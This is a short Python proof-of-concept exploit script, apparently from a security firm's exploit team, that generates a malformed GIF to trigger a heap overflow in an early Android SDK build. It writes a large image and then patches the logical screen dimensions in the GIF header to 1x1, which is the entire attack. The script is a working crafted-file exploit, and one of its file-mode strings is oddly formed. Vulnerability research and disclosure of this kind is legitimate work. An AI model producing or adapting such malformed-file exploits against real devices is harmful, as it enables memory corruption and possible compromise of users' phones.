##Android Heap Overflow
##Ortega Alfredo _ Core Security Exploit Writers Team
##tested against Android SDK m3-rc37a

import Image
import struct

#Creates a _good_ gif image
imagename='overflow.gif'
str = '\x00\x00\x00\x00'*30000
im = Image.frombuffer('L',(len(str),1),str,'raw','L',0,1)
im.save(imagename,'GIF')

#Shrink the Logical screen dimension
SWidth=1
SHeight=1

img = open(imagename,'rb').read()
img = img[:6]+struct.pack('<HH',SWidth,SHeight)+img[10:]

#Save the _bad_ gif image
q=open(imagename,'wb=""')
q.write(img)
q.close()
